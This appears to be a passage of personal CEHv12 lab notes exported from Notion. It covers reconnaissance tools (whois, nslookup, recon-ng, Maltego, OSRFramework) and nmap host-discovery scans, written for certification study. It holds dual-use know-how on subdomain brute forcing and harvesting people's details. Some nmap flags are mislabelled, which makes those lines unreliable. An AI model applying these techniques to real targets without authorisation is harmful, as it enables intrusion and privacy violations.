class="bulleted-list"><li style="list-style-type:disc">creates a depth 2</li></ul><ul id="db2b6ffc-ad48-4da9-bf7c-21377ce1fe03" class="bulleted-list"><li style="list-style-type:disc">min word size 5</li></ul><ul id="b9d525a8-5a61-4d31-a27f-0989820fbf77" class="bulleted-list"><li style="list-style-type:disc">search on the site and returns a list of words</li></ul><ul id="cbdbcfa2-dc87-4399-ac9f-afa29e42c5f6" class="bulleted-list"><li style="list-style-type:disc">not that usefull because passwords are not created like this</li></ul></details></li></ul><ul id="73a86822-1c4f-44dd-b5fa-b6a506fc8572" class="toggle"><li><details open=""><summary>eMailTrackerPro</summary><ul id="1eaa2148-f58c-439d-bb13-805ad9d7c69f" class="bulleted-list"><li style="list-style-type:disc">in <strong>\CEH-Tools\CEHv12 Module 02 Footprinting and Reconnaissance\Email Tracking Tools\eMailTrackerPro</strong></li></ul><ul id="7b58b2ba-06ac-4d56-bcbc-7972406c520f" class="bulleted-list"><li style="list-style-type:disc">You copy a header of an email from your provider</li></ul><ul id="52c2a9ee-0cec-4b1f-9746-5b1e3e2fa761" class="bulleted-list"><li style="list-style-type:disc">Select My Trace Report → Trace Headers → Paste</li></ul><ul id="a4673d74-5810-4955-aec9-f3302964e6de" class="bulleted-list"><li style="list-style-type:disc">But doesn’t work, its incorrect and only works on personal emails</li></ul><ul id="9a7b1bcb-6a71-4c00-8a78-b0a52f8803f9" class="bulleted-list"><li style="list-style-type:disc">Other Tools: Infoga (github), Mailtrack.io</li></ul></details></li></ul><ul id="95f2dca6-6291-4229-8aef-a38127e277e3" class="toggle"><li><details open=""><summary>DNS Enumeration</summary><ul id="0c464f55-29fd-4abe-97a7-85f680ce6f13" class="toggle"><li><details open=""><summary>Whois Footprinting</summary><ul id="61b52601-f56f-40a6-b777-9b41b2776d1f" class="bulleted-list"><li style="list-style-type:disc">his method provides target domain information such as the owner, its registrar, registration details, name server, contact information, etc.</li></ul><ul id="8ac3b701-42a9-4dd9-bf05-4b050306a664" class="bulleted-list"><li style="list-style-type:disc">Using this information, you can create a map of the organization’s network to perform other scans or attacks</li></ul><ul id="3b447432-c62c-4498-ae98-49121b76d360" class="bulleted-list"><li style="list-style-type:disc">whois.domaintools.com</li></ul><ul id="463deed4-dc63-4147-b113-e2107f2ffe42" class="bulleted-list"><li style="list-style-type:disc">Others Tools: SmartWhois (tamos.com), Batch IP Converter (sabasoft.com)</li></ul></details></li></ul><ul id="09fb0f92-ae0d-4e76-9cd7-630eaf8c48ec" class="toggle"><li><details open=""><summary>extended nslookup</summary><ul id="1e55f5b7-434c-4264-a866-ff32d492c34a" class="bulleted-list"><li style="list-style-type:disc">Interactive mode:<ul id="18a3ba93-283e-419d-9e13-e9ad8c256d9c" class="bulleted-list"><li style="list-style-type:circle"><code>nslookup</code></li></ul><ul id="29bc307e-bb81-49d1-8745-5bc7cd065dcc" class="bulleted-list"><li style="list-style-type:circle"><code>&gt; set type=cname</code></li></ul><ul id="69b45d95-d1d3-4eb2-992f-03ab77c9da6c" class="bulleted-list"><li style="list-style-type:circle"><code>&gt; www.certifiedhacker.com</code></li></ul></li></ul><ul id="f282e9ec-e061-4be2-91e3-8ce6e52e42f0" class="bulleted-list"><li style="list-style-type:disc">when you find the name server, you may do attacks on that<ul id="9a5d1175-9e46-41ae-b1fb-573460dd4153" class="bulleted-list"><li style="list-style-type:circle">to achieve ddos, url redirection etc</li></ul></li></ul><ul id="fd594970-f30a-4e4c-8a83-3e68bd4c4d0a" class="bulleted-list"><li style="list-style-type:disc">Passive Scanning:<ul id="7b01dfb4-eb56-4027-af5c-fda6fc64ea08" class="bulleted-list"><li style="list-style-type:circle">kloth.net/services/nslookup.php</li></ul></li></ul><ul id="12af32d8-046f-42c0-acc4-bc03befa2976" class="bulleted-list"><li style="list-style-type:disc">Other Tools: DNSdumpster (dnsdumpster.com), DNS Records (network-tools.com)</li></ul></details></li></ul><ul id="ed531a15-ae06-4564-95a9-5bb950be2259" class="toggle"><li><details open=""><summary>Find other domains</summary><ul id="acf639ea-d202-4c40-bb23-55c2c33791c9" class="bulleted-list"><li style="list-style-type:disc"><a href="http://yougetsignal.com">yougetsignal.com</a> → Reverse IP Domain Check</li></ul></details></li></ul><ul id="38a96010-f568-4e05-92dd-d57e0147dba9" class="toggle"><li><details open=""><summary><a href="http://Secyritytrails.com">Secyritytrails.com</a> (very good)</summary><ul id="fa3a8df3-c1b0-471f-bff6-9a84d7a56146" class="bulleted-list"><li style="list-style-type:disc">Neds account (fake)</li></ul><ul id="3b7a4f9a-475e-466a-8248-4e1e8f23f893" class="bulleted-list"><li style="list-style-type:disc">Can give alot of info</li></ul><ul id="5028bf93-e315-46a9-99c5-c9f9ebc2bb44" class="bulleted-list"><li style="list-style-type:disc">Other Tools: DNSChecker.org, <a href="http://DNSdumpster.com">DNSdumpster.com</a> (good one)</li></ul></details></li></ul><ul id="bab1ede1-b512-4f67-81c0-c7100b95cbd3" class="toggle"><li><details open=""><summary>Domain Dossier (centralops.net) - very very useful</summary></details></li></ul></details></li></ul></details></li></ul><ul id="a885979e-0410-4b4c-b721-0c9264a7a8ba" class="toggle"><li><details open=""><summary>Footprinting</summary><p id="aa7b0323-c6d0-4672-ae19-c81763d9c29f" class="">Gather the network-related information of a target organization such as network range, traceroute, TTL values, etc. </p><p id="4c620cdb-dd53-4010-8b83-6225ad787f3f" class="">Information collected by the footprinting tools contains the target’s IP location information, routing information, business information, address, phone number and social security number, details about the source of an email and a file, DNS information, domain information, etc.</p><p id="47c7c9d8-ed2b-42d6-b4c6-47be00243137" class="">This information will help create a map of the target network </p><ul id="9c6536e1-d6fa-4d98-b339-b6cd188a8b04" class="toggle"><li><details open=""><summary>traceroute (seems dumb but useful)</summary><ul id="22c47c98-b4b8-421b-903e-062be22fcf47" class="bulleted-list"><li style="list-style-type:disc">find the ips between source and dest</li></ul><ul id="b880f20c-2224-4666-8bf3-10abd472dd20" class="bulleted-list"><li style="list-style-type:disc">maybe the website is behind a firewall or a router</li></ul><ul id="c58a9405-020c-46d5-aff3-51d905867fa8" class="bulleted-list"><li style="list-style-type:disc">this is to map the network topology of the org</li></ul><ul id="54e8b615-3bdf-4c51-a2e7-6156a074146b" class="bulleted-list"><li style="list-style-type:disc">Can use tcptraceroute if icmp is blocked</li></ul><ul id="6a188a87-f6d3-4206-979f-426af15ab7c7" class="bulleted-list"><li style="list-style-type:disc">Other Tools: VisualRoute.com, Traceroute NG (solarwinds.com)</li></ul></details></li></ul><ul id="8d14c69c-5e40-457e-9ced-38365a33d2c9" class="toggle"><li><details open=""><summary>recon-ng</summary><ul id="ebf26355-418c-4ec6-8450-936d84e41f48" class="bulleted-list"><li style="list-style-type:disc">its a framework with modules that you can use to perform reconnaisance</li></ul><ul id="8421250e-b233-45f5-89e4-32c0dd866d38" class="bulleted-list"><li style="list-style-type:disc">Good thing about this, there are modules, as the ones written below that use passive reconnaisance</li></ul><ul id="15921b41-083d-4340-ad02-cba9dbfdf116" class="bulleted-list"><li style="list-style-type:disc">its just like metasploit</li></ul><ul id="1be06f99-f079-41ad-ae73-c4ae695817fb" class="bulleted-list"><li style="list-style-type:disc">has a marketplace with modules</li></ul><ul id="c1011a13-3d49-4102-a0d7-df8d8532d81d" class="toggle"><li><details open=""><summary>Usage info</summary><ul id="6ed39b95-9f42-446b-8e3b-b552942959d7" class="bulleted-list"><li style="list-style-type:disc"><code>marketplaces install all </code>to install them all</li></ul><ul id="a2f18d53-00c6-4b9a-89c8-048e119884d3" class="bulleted-list"><li style="list-style-type:disc"><code>modules search &lt;search terms&gt;</code> to search modules</li></ul><ul id="eaa3bc72-5843-4d0f-a8a8-ae0c24881c6a" class="bulleted-list"><li style="list-style-type:disc"><code>workspaces create &lt;name&gt;</code> to create a workspace to perform the actions you want</li></ul><ul id="7ec2303e-1f23-4ce0-86fc-fea9a6f5705e" class="bulleted-list"><li style="list-style-type:disc"><code>workspaces list</code> to list workspaces</li></ul><ul id="ef47eef9-db50-4c74-958a-337f571849a4" class="bulleted-list"><li style="list-style-type:disc"><code>db insert domains</code> to enter websites you want to perform the recons to</li></ul><ul id="0b3ae8f6-c42a-44f8-b843-5cfd60762a65" class="bulleted-list"><li style="list-style-type:disc"><code>show domains</code> to show the domains you have added</li></ul><ul id="a0406df1-a3c5-41bf-8496-27b6e4b03ff9" class="bulleted-list"><li style="list-style-type:disc"><code>back</code> goes back</li></ul><ul id="b26b8100-6593-41c3-9f28-49a24123070d" class="bulleted-list"><li style="list-style-type:disc"><code>modules load reporting</code> to find the reporting formats<ul id="74aa4aa4-dd13-4198-92ce-6f84eb4eea60" class="bulleted-list"><li style="list-style-type:circle">you can select one and run it</li></ul><ul id="8c0b7105-9585-4c6e-867e-0290773d49c7" class="bulleted-list"><li style="list-style-type:circle">needs to set CREATOR, CUSTOMER and FILENAME (path) with <code>options set</code></li></ul></li></ul><ul id="ca91541c-6a2a-496d-a7ad-190cc373a849" class="bulleted-list"><li style="list-style-type:disc"><code>modules load &lt;module/string&gt;</code> <ul id="e14b926d-2ea2-477e-beb8-bad9625436af" class="bulleted-list"><li style="list-style-type:circle">to load a module</li></ul><ul id="84b4332e-a71b-4923-bf3f-dbf9d19a8407" class="bulleted-list"><li style="list-style-type:circle">can also be used for search</li></ul><p id="e1a3662d-68f1-43ae-b243-83003de2b144" class="">
</p></li></ul></details></li></ul><ul id="1ff1e4a2-83d2-4fa0-bf45-08f278661a3e" class="toggle"><li><details open=""><summary>Recon a domain</summary><ul id="14ceb427-03e2-4409-9363-663a66f3d357" class="bulleted-list"><li style="list-style-type:disc"><code>modules load recon/domains-hosts/brute_hosts</code> <ul id="f2bef935-a712-4b38-abab-c511a052bc60" class="bulleted-list"><li style="list-style-type:circle">will brute force for subdomains</li></ul><ul id="daef4e91-74dd-491b-b96d-5cb0857892ba" class="bulleted-list"><li style="list-style-type:circle">Others:<ul id="116d19c8-45dc-44e8-b178-5d95a2b6ffe5" class="bulleted-list"><li style="list-style-type:square"><code>recon/domains-hosts/bing_domain_web</code></li></ul><ul id="e9742069-e9f8-4763-b3e5-58993b31c2f2" class="bulleted-list"><li style="list-style-type:square"><code>recon/domains-hosts/netcraft</code></li></ul></li></ul><ul id="967f3149-f21d-4f4a-a761-4141d4c6044e" class="bulleted-list"><li style="list-style-type:circle"><code>show hosts</code> will show the results</li></ul></li></ul><ul id="3f352bba-f039-4b46-aca9-3a23fd497814" class="bulleted-list"><li style="list-style-type:disc"><code>recon/domains-hosts/hackertarget</code><ul id="37ea0feb-4d4a-4ae8-94ff-1e37ee05c7d7" class="bulleted-list"><li style="list-style-type:circle">uses <a href="http://hackertarget.com">hackertarget.com</a> api to find hostnames</li></ul><ul id="8b47b0f8-2b2e-43c6-a9f4-107588ad7735" class="bulleted-list"><li style="list-style-type:circle">works on cyprus aswell</li></ul></li></ul></details></li></ul><ul id="c2ba02ed-73a0-4255-87ad-8181a7b2b904" class="toggle"><li><details open=""><summary>Gather personnel info</summary><ul id="0779446c-9afa-46e1-b262-bcd4312f6f43" class="bulleted-list"><li style="list-style-type:disc"><code>recon/domains-contacts/whois_pocs</code><ul id="588231ba-2c41-4a46-aa43-d5a76d4aa05c" class="bulleted-list"><li style="list-style-type:circle">This module uses the ARIN Whois RWS to harvest POC data from Whois queries for the given domain.</li></ul><ul id="3134e62b-8625-4fb4-883c-2ff29d6116d1" class="bulleted-list"><li style="list-style-type:circle">Not useful for europe, we are under RIPE NCC</li></ul></li></ul></details></li></ul></details></li></ul><ul id="74ae08ab-c268-45de-b82a-997c4da25468" class="toggle"><li><details open=""><summary>Maltego</summary><ul id="0a9e74b8-8aef-468f-b7ca-caba062bf78f" class="bulleted-list"><li style="list-style-type:disc">There are entities on the left side at the palette to drag into the graph</li></ul><ul id="e867306c-dc38-42bf-ba38-39fb9fff02fe" class="bulleted-list"><li style="list-style-type:disc">Double click on the entity to change the website</li></ul><ul id="179daf0a-d93e-452f-aa29-00a4223f7779" class="bulleted-list"><li style="list-style-type:disc">Right click on the entity to perform actions that add information and other entities to the graph </li></ul><ul id="9f046c31-a159-4ca0-bbe2-8d26ac52ee80" class="bulleted-list"><li style="list-style-type:disc"><strong>Note: </strong>Delete previous results so that you dont get notified of free version limitation </li></ul><ul id="0abcdea1-0a7c-45c5-9780-08825ed21a8b" class="bulleted-list"><li style="list-style-type:disc">Example used:<ul id="9a01376d-ebfc-417c-b405-8192fb030e19" class="bulleted-list"><li style="list-style-type:circle">All Transformations → to Domains<ul id="70d644e0-bd86-4d97-9a1d-a04ab234ced9" class="bulleted-list"><li style="list-style-type:square">For the website → to IP Address <ul id="7e6d4626-2fd7-48d8-9818-5fa32ef4edce" class="bulleted-list"><li style="list-style-type:disc">For the IP → To Location</li></ul></li></ul></li></ul><ul id="5903f514-0ea2-42df-9276-944a5a6be7c4" class="bulleted-list"><li style="list-style-type:circle">For each domain found → <ul id="0d166035-f15f-4837-a129-eccf9b96ecbe" class="bulleted-list"><li style="list-style-type:square">To DNS Name [using name schema dictionary]</li></ul><ul id="97290f9c-665a-4cdc-aa46-2b51b1dca7a0" class="bulleted-list"><li style="list-style-type:square">To MX (mail server)</li></ul><ul id="2c9e1a73-f3bd-4ca2-97d4-f10c741a53b3" class="bulleted-list"><li style="list-style-type:square">To NS (name server)</li></ul><ul id="21643a6c-c87a-42fc-b2a7-49691d438ece" class="bulleted-list"><li style="list-style-type:square">To Entities from WHOIS</li></ul><p id="a8ef3b7c-4d64-4f2c-9618-64308cbdb8ff" class="">
</p></li></ul></li></ul><ul id="d89b1187-fbfb-42d7-8e16-2b97834b9e3d" class="bulleted-list"><li style="list-style-type:disc">Other use cases:<ul id="2ef54d9b-65db-4aee-a49b-1481ce8373b0" class="bulleted-list"><li style="list-style-type:circle">extract info from people at social media</li></ul><ul id="4f18ee20-2631-4246-a91f-b1642b9cb9b5" class="bulleted-list"><li style="list-style-type:circle">track accounts, conversations</li></ul></li></ul></details></li></ul><ul id="3176b732-ae30-46a4-bc58-0f9213feb12a" class="toggle"><li><details open=""><summary>OSRFramework</summary><p id="900d3d48-a2d8-4ec9-803a-6cea33ecb7cf" class="">OSRFramework is a set of libraries that are used to perform Open Source Intelligence tasks. They include references to many different applications related to username checking, DNS lookups, information leaks research, deep web search, regular expressions extraction, and many others.</p><p id="010be57a-347b-4e12-a6a4-1d77b6766324" class="">
</p><ul id="51dd5ca2-1a2c-4103-bbae-8068246f7bdf" class="bulleted-list"><li style="list-style-type:disc">domainfy -n [domain name (no ext)] -t all<ul id="51f06316-cb79-4f75-a9f6-f306edc8a2c4" class="bulleted-list"><li style="list-style-type:circle">lists dns records with that domain name eg. cna.org, <a href="http://cna.com">cna.com</a> etc</li></ul></li></ul><ul id="a82f6148-4922-4343-a7cd-c2c98c6d31b2" class="bulleted-list"><li style="list-style-type:disc">searchfy -q “name”<ul id="ec86caec-86c2-46b0-a8aa-e3fdd018282b" class="bulleted-list"><li style="list-style-type:circle">finds info about people</li></ul><ul id="3af7f646-6ae1-4bab-af93-07aaff7e4836" class="bulleted-list"><li style="list-style-type:circle">didn’t work for “Krinos Vasileiou”</li></ul></li></ul><ul id="dcba226e-9c9b-49e9-b3be-3b6ebe81bb25" class="bulleted-list"><li style="list-style-type:disc">usufy -n “name”<ul id="3478d12f-3571-46da-8c67-74a94224ea40" class="bulleted-list"><li style="list-style-type:circle">find info about usernames</li></ul><ul id="c8ce90ab-2253-4ce9-b161-392d582f6942" class="bulleted-list"><li style="list-style-type:circle">false positives for  “justkrinos”</li></ul></li></ul><ul id="05c6c38b-4e99-4236-8992-e82d26c780e4" class="bulleted-list"><li style="list-style-type:disc">Others: mailfy, phonefy, entify</li></ul></details></li></ul><ul id="4aa0269d-e215-4b50-8649-1758f809953c" class="toggle"><li><details open=""><summary>FOCA</summary><ul id="4f1c6aa9-7540-4df6-855d-f937e179ba46" class="bulleted-list"><li style="list-style-type:disc"><strong>CEHv12 Module 02 Footprinting and Reconnaissance\Footprinting Tools\FOCA</strong> and double-click <strong>FOCA.exe</strong></li></ul><ul id="2bbaa469-6208-4eec-96f7-9dd9a00c7ed7" class="bulleted-list"><li style="list-style-type:disc">Can automatically find files in web applications through search engine searching</li></ul><ul id="a4bed488-22ac-4b3f-8906-a5fec6c698d9" class="bulleted-list"><li style="list-style-type:disc">Has metadata Summary for content</li></ul><ul id="c9eb6ff3-e3bb-46ce-8691-9483a2be5f7d" class="bulleted-list"><li style="list-style-type:disc">Can also find networks and domains</li></ul><ul id="dd8ba740-0d69-495d-8fd3-cfc6ff38b2f3" class="bulleted-list"><li style="list-style-type:disc">Can crawl websites through google but doesnt work<br/><br/><br/></li></ul><p id="07a30070-a24c-4f34-9591-7088c7b1d75d" class="">
</p></details></li></ul><ul id="ff7fb564-7ee2-44c0-82e7-b491fe4672cb" class="toggle"><li><details open=""><summary>BillCipher</summary><ul id="92b44560-1cf4-4c39-8933-5cb38f77041d" class="bulleted-list"><li style="list-style-type:disc">Mutliple tools to get info about a website</li></ul><ul id="b8608758-a388-47cc-8c94-2c234c089e3a" class="bulleted-list"><li style="list-style-type:disc">dns, robots, whois, geoip, subnets, port scanner, page links, zone trasfer, http headers, </li></ul><ul id="498d7e2b-42d6-4390-aa63-bc77ec139663" class="bulleted-list"><li style="list-style-type:disc">Subnet Lookup is interesting, can maybe be used to find other ip addresses</li></ul></details></li></ul><ul id="663ceca8-e6e0-4ce4-835c-abebee13614b" class="toggle"><li><details open=""><summary>OSINT Framework</summary><p id="cd39469f-2efe-48a6-839d-bc35fd3e9ded" class="">OSINT Framework is an open source intelligence gathering framework that helps security professionals for performing automated footprinting and reconnaissance, OSINT research, and intelligence gathering.</p><p id="277e5daf-e9bc-4811-a0d8-26e88411052e" class="">
</p><p id="362c0cda-9bb8-4134-be35-0356d3c76613" class="">The OSINT Framework includes the following indicators with the available tools:</p><ul id="6096c986-1ad8-465c-9990-ad902072cf51" class="bulleted-list"><li style="list-style-type:disc">(T) - Indicates a link to a tool that must be installed and run locally</li></ul><ul id="46bdcdde-af29-471c-9ecc-9e73aacbb7e6" class="bulleted-list"><li style="list-style-type:disc">(D) - Google Dork</li></ul><ul id="7fe51a02-9985-407b-8f1e-a877fdab7490" class="bulleted-list"><li style="list-style-type:disc">(R) - Requires registration</li></ul><ul id="d729a30c-d1ab-459e-8cf4-0a6a6eaa3b30" class="bulleted-list"><li style="list-style-type:disc">(M) - Indicates a URL that contains the search term and the URL itself must be edited manually</li></ul><p id="3d5ad368-892d-48e5-a22d-fcc0e7710587" class="">
</p><ul id="9d5b958b-88a9-409f-95e2-9cf0e49af593" class="bulleted-list"><li style="list-style-type:disc">Has ALOOOT of stuff, can go here when i want to find tools for something</li></ul><p id="1d2cbb66-7107-47b1-99a1-fb8e69250622" class="">
</p></details></li></ul><ul id="cc3b02da-f388-4dfd-9886-847a1d807694" class="toggle"><li><details open=""><summary>GRecon (github) - powerful</summary><ul id="7bdb5744-7cde-4632-8acc-e46bc0a755e5" class="bulleted-list"><li style="list-style-type:disc">Automated google hacking</li></ul><ul id="6d18b7da-084e-4be8-bc20-4e4e226a83e3" class="bulleted-list"><li style="list-style-type:disc">Very powerful for passive recon,</li></ul><ul id="400f0605-588f-4e16-a077-34a267520a1d" class="bulleted-list"><li style="list-style-type:disc">Identifies CMS, honeypots, subdomains, login pages, exposed docs, wordpress etc.</li></ul></details></li></ul><ul id="2e91beae-43ab-46ef-ae3f-ae28aadc217d" class="bulleted-list"><li style="list-style-type:disc">Other Tools: Recon-Dog (gtihub),Th3Inspector (github), Recoon (github), Orb (github)</li></ul><p id="3d489995-45b9-4b85-8f91-48b548e91ee9" class="">
</p></details></li></ul></details></li></ul><ul id="a4e7792d-40f7-43af-926d-14a68360dd71" class="toggle"><li><details open=""><summary>Lab 2 - Scanning</summary><p id="a112e0ab-3e4b-4084-82e1-522b69d461b4" class="">Scanning itself is an extended form of reconnaissance </p><p id="22e7d5ca-cd28-4b1a-86dd-354fed65143c" class="">This phase is about learning information about open ports and services, OSes, vulnerabilities and any configuration lapses.</p><p id="a9040671-772e-47ce-9c6d-3f31aa486fd9" class="">The information gleaned from this reconnaissance helps you to select strategies for the attack on the target system or network.</p><ul id="9906f6b8-47eb-4c3d-8daa-86d7bd2a8f52" class="toggle"><li><details open=""><summary>Ping scans</summary><ul id="1f2942b4-65e8-42b0-996b-a537ef5a056b" class="toggle"><li><details open=""><summary>Nmap</summary><ul id="e9645184-b29c-4d3c-88b5-b5ddac443064" class="bulleted-list"><li style="list-style-type:disc">Multiple methods to ping: <ul id="ba8cf6ca-a350-4025-8fad-2af2de7e6e86" class="bulleted-list"><li style="list-style-type:circle">ARP ping scan</li></ul><ul id="411189d0-492b-46cc-954c-237c2be26a3a" class="bulleted-list"><li style="list-style-type:circle">UDP ping scan</li></ul><ul id="70c708ac-53e2-466b-8c3e-ce3ceffb2a93" class="bulleted-list"><li style="list-style-type:circle">ICMP ECHO ping scan</li></ul></li></ul><ul id="82cc0b8b-6490-478d-a66e-493a4b7e02d7" class="bulleted-list"><li style="list-style-type:disc">Target range can be 10.10.10.10-20 for [10,20]</li></ul><ul id="ec00845e-cfb4-4c55-b363-e840c146e293" class="toggle"><li><details open=""><summary>Ping scan examples</summary><ul id="22d61a49-f0b4-4374-aa92-e67336b6e66d" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn -PR &lt;target&gt;</code><ul id="537fdc72-a240-48a1-b4e7-92152e4d4b90" class="bulleted-list"><li style="list-style-type:circle"><code>-sn</code> disables port scan</li></ul><ul id="6a13dd99-d040-44ee-abd5-328d81dd6185" class="bulleted-list"><li style="list-style-type:circle"><code>-PR</code> performs ARP ping scan</li></ul><ul id="9b578cb7-8928-4cd3-8316-efd37f16fd24" class="bulleted-list"><li style="list-style-type:circle">checks if the target is up using ARP</li></ul></li></ul><ul id="c152a726-cc48-400e-8616-bdc36a600083" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn -PU</code> <ul id="40b0afe6-9ab3-4a2e-bcb1-f3f361c830c0" class="bulleted-list"><li style="list-style-type:circle"><code>-sn</code> disables port scan</li></ul><ul id="2553bd9f-cb72-4fd6-aa33-3c37924505d5" class="bulleted-list"><li style="list-style-type:circle"><code>-PU</code> performs UDP ping scan</li></ul><ul id="442dd7e5-96ef-48c8-a783-1b5fe6cfb137" class="bulleted-list"><li style="list-style-type:circle">checks if the target is up using UDP</li></ul></li></ul><ul id="419dcfd4-c65c-49e7-b238-059051b4d246" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn -PE</code> <ul id="931710b7-73c5-497e-bdec-2879a6f00c8c" class="bulleted-list"><li style="list-style-type:circle"><code>-sn</code> disables port scan</li></ul><ul id="5511a95b-e4e5-4af9-82e4-7f495713108f" class="bulleted-list"><li style="list-style-type:circle"><code>-PE</code> performs ICMP ping scan</li></ul><ul id="8f0d2999-cda5-4389-b2a8-709cc4bf31e0" class="bulleted-list"><li style="list-style-type:circle">checks if the target is up using ICMP</li></ul><ul id="359e452e-093d-493b-a799-691d045f6cdd" class="bulleted-list"><li style="list-style-type:circle">This scan is useful for locating active devices or determining if the ICMP is passing through a firewall.</li></ul></li></ul><ul id="9b1363c4-8b23-44c9-af7b-7f5a32307b55" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn PP</code><ul id="3ac78ad1-5d48-40c3-87aa-277b7aa498a0" class="bulleted-list"><li style="list-style-type:circle"><code>-sn</code> disables port scan</li></ul><ul id="fa985456-b7b0-4604-a236-c46c4f85e680" class="bulleted-list"><li style="list-style-type:circle"><code>-PE</code> performs ICMP timestamp ping scan</li></ul><ul id="0343ef0b-a43c-4c7c-bbba-9e9f5ab3a57c" class="bulleted-list"><li style="list-style-type:circle">just a ping but uses timestap</li></ul><ul id="2b751dfb-3be6-44c2-9411-002de84dd0d5" class="bulleted-list"><li style="list-style-type:circle">an acquire info related to current time from target</li></ul><ul id="52106e1b-2fbb-4de4-a526-4531cb776784" class="bulleted-list"><li style="list-style-type:circle">these can be used for log injections</li></ul></li></ul><ul id="2fef91c1-98c5-42da-a776-147bb32992e1" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn PM</code><ul id="b2bd6017-e325-4f1e-a3fe-3d2c2cf9c7f3" class="bulleted-list"><li style="list-style-type:circle"><code>-sn</code> disables port scan</li></ul><ul id="455000aa-93d0-4714-b7b6-7daeaec5cb25" class="bulleted-list"><li style="list-style-type:circle"><code>-PE</code> performs ICMP Address Mask ping scan</li></ul><ul id="6e464014-6847-4e1f-97b9-95c113a93834" class="bulleted-list"><li style="list-style-type:circle">just a ping like before but maybe successfull if they block icmp echo pings</li></ul></li></ul><ul id="4855ea13-5528-4e3c-89e9-29c944ee7b9e" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn PS</code><ul id="54c3a5cf-3a0f-449c-a6d2-9c5dd13e42a0" class="bulleted-list"><li style="list-style-type:circle"><code>sn</code> disables port scan</li></ul><ul id="0852e121-4bdf-42aa-9702-2c7158db9525" class="bulleted-list"><li style="list-style-type:circle"><code>PS</code> sends empty TCP SYN packets to the target host</li></ul><ul id="d4b5f865-bf32-4bad-a50b-65240bbc3ab6" class="bulleted-list"><li style="list-style-type:circle">ACK response means that the host is active.</li></ul></li></ul><ul id="660c1cfb-8ece-4802-83ab-14ba48657b2a" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn PA</code><ul id="6ae6c7e4-e46b-41c5-82a2-08293d027c1c" class="bulleted-list"><li style="list-style-type:circle"><code>sn</code> disables port scan</li></ul><ul id="64700c96-47cb-4ccb-a389-940570359105" class="bulleted-list"><li style="list-style-type:circle"><code>PA</code> sends empty TCP ACK packets to the target host</li></ul><ul id="5a6405a4-b486-4999-ba0e-ffb5a8ad78a7" class="bulleted-list"><li style="list-style-type:circle">RST response means that the host is active.</li></ul></li></ul><ul id="40a28693-7beb-45e3-ba05-598ac4c4110f" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sn PO</code><ul id="31abcde6-12b7-4c3b-948b-18a495711da8" class="bulleted-list"><li style="list-style-type:circle"><code>sn</code> disables port scan</li></ul><ul id="5d95bf91-7009-442b-9703-26373f881f98" class="bulleted-list"><li style="list-style-type:circle"><code>PO</code> sends different probe packets of different IP protocols to the target host</li></ul><ul id="a0ac4624-95b0-458e-b175-fc87bd6d3d9f" class="bulleted-list"><li style="list-style-type:circle">any response from any probe indicates that a host is active.</li></ul><p id="ecca5a09-f619-4d6c-8339-ee73071dfb7b" class="">
</p></li></ul></details></li></ul></details></li></ul><ul id="82c4d8ed-78c0-411f-97a7-df632ad4aaae" class="toggle"><li><details open=""><summary>Angry IP Scaner  (win)</summary><ul id="396afe23-02c3-49b7-936c-0c6626f79b1e" class="bulleted-list"><li style="list-style-type:disc">accepts a range of ips</li></ul><ul id="f566e1be-657e-4b0e-bf57-67c3a1ff8cd7" class="bulleted-list"><li style="list-style-type:disc">scans automatically like network mapper</li></ul><ul id="7ab1409f-525e-41ee-9f45-7a5ea387f7e9" class="bulleted-list"><li style="list-style-type:disc">Γρανάτζι → Ping Method: Combined TCP+UDP</li></ul><ul id="07d2f7c2-8b59-4d44-ab13-bf47126e1617" class="bulleted-list"><li style="list-style-type:disc">Display Tab → Alive hosts</li></ul><ul id="972521e4-7c07-46fe-8117-d43b9dea07cf" class="bulleted-list"><li style="list-style-type:disc">Other Tools: Solar Winds Engineer Toolset, NetScanTools Pro, Colasoft Ping tools, Visual Ping Tester, OpUtils</li></ul></details></li></ul></details></li></ul><ul id="d74f574b-f1ba-4b59-805d-d50bf6914ce8" class="toggle"><li><details open=""><summary>Port Scans</summary><ul id="90099523-7b73-439b-9502-cf5baa10d661" class="toggle"><li><details open=""><summary>MegaPing (win)</summary><ul id="d99a3849-3b53-4f44-8c01-8019bde320b5" class="bulleted-list"><li style="list-style-type:disc"><strong>CEH-Tools\CEHv12 Module 03 Scanning Networks\Scanning Tools\MegaPing</strong> and double-click <strong>megaping_setup.exe</strong></li></ul><ul id="47741cf0-6926-48ae-b1cb-a8fb7e5718df" class="bulleted-list"><li style="list-style-type:disc">Has multiple scanning options<ul id="a670261e-5ee5-4003-89e6-39dde4ae136b" class="bulleted-list"><li style="list-style-type:circle">ip scan, portscan, traceroute, netbios scan, security scan, dns list hosts etc.</li></ul></li></ul><ul id="3b2e7050-4bc5-4b7d-86d0-e76eca66c56d" class="bulleted-list"><li style="list-style-type:disc">can perform a good port scan with identification of ports<br/><br/></li></ul></details></li></ul><ul id="21ea7a9a-4c21-44da-ac9a-9e51cc90d207" class="toggle"><li><details open=""><summary>NetScanToolsPro (win)</summary><ul id="7942bbf9-464a-4960-ab96-6ca7cc6571d2" class="bulleted-list"><li style="list-style-type:disc">Has alot of usefull gui tools for scanning and finding stuff</li></ul><ul id="30ef3068-7dbc-43bc-8278-7e5345332006" class="bulleted-list"><li style="list-style-type:disc">Has multiple options for each tool</li></ul><ul id="fd20911e-4ba5-4039-95c5-c63b1cca6911" class="bulleted-list"><li style="list-style-type:disc">Examples:<ul id="4141f37d-fddc-4d84-a58c-1e40d63f969d" class="bulleted-list"><li style="list-style-type:circle">Manual Tools → Ping Scanner</li></ul><ul id="53202a42-7259-445e-bf21-014411203cb5" class="bulleted-list"><li style="list-style-type:circle">Manual Tools → Port Scanner</li></ul></li></ul></details></li></ul><ul id="1ce421b8-a1d1-4bf1-95b7-45642627ae8e" class="toggle"><li><details open=""><summary>sxTool</summary><p id="ee44c2fb-f8a8-44b8-93cb-c4cf1b7f785a" class="">The sx tool is a command-line network scanner that can be used to perform:<div class="indented"><ul id="4eee73cc-0142-48bf-bdcb-c82492a4e44c" class="bulleted-list"><li style="list-style-type:disc"> ARP scans, ICMP scans, TCP SYN scans, UDP scans</li></ul><ul 